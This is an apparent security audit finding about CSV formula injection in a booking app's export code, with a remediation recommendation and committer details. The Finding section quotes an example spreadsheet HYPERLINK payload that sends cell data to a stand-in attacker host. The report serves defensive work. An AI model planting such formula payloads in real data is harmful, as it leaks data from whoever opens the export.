# [MEDIUM] CSV exports do not neutralize spreadsheet formulas

**File:** [`lib/export/csv.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/lib/export/csv.ts#L8-L34) (lines 8, 14, 18, 34)
**Project:** nabatableLP
**Severity:** MEDIUM • **Confidence:** high • **Slug:** `other-csv-formula-injection`

## Owners

**Suggested assignee:** `aman.shrestha@mail.bcu.ac.uk` _(via last-committer)_

## Finding

escapeCSVField only quotes fields containing delimiters and escapes double quotes; it does not neutralize values beginning with spreadsheet formula prefixes such as =, +, -, @, tab, or CR/LF followed by a formula. generateCSV applies this helper to user-controlled booking/customer fields. The ops bookings export includes guest-controlled fields such as customerName, customerEmail, phone, allergies, profile notes, and booking notes, and the customers export includes customer name/email/phone. A malicious guest could set a field to a formula such as =HYPERLINK("https://attacker.example/?x="&A1,"click") or other spreadsheet-specific payload. When staff export and open the CSV in Excel/LibreOffice/Sheets, the spreadsheet may evaluate the formula and leak data or trigger unsafe external interactions.

## Recommendation

Add formula-injection protection in escapeCSVField before returning the cell. For any string whose first non-whitespace/control character is one of =, +, -, or @, prefix a single quote or another accepted neutralizing character, then quote/escape normally. Apply this consistently to all data cells, and add tests covering delimiter-free and quoted formula payloads.

## Recent committers (`git log`)

- amanshresthaa <aman.shrestha@mail.bcu.ac.uk> (2025-10-11)
